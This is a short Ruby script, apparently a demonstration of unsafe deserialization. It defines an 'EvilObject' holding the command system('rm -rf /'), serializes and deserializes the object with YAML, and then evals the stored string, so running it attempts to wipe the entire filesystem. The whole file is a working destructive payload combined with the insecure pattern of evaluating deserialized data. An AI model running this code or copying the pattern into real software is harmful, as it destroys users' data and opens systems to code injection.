require 'yaml'

class EvilObject
  def initialize
    @command = "system('rm -rf /')"
  end
end

object = EvilObject.new
serialized_object = YAML::dump(object)
deserialized_object = YAML::load(serialized_object)
eval(deserialized_object.instance_variable_get(:@command))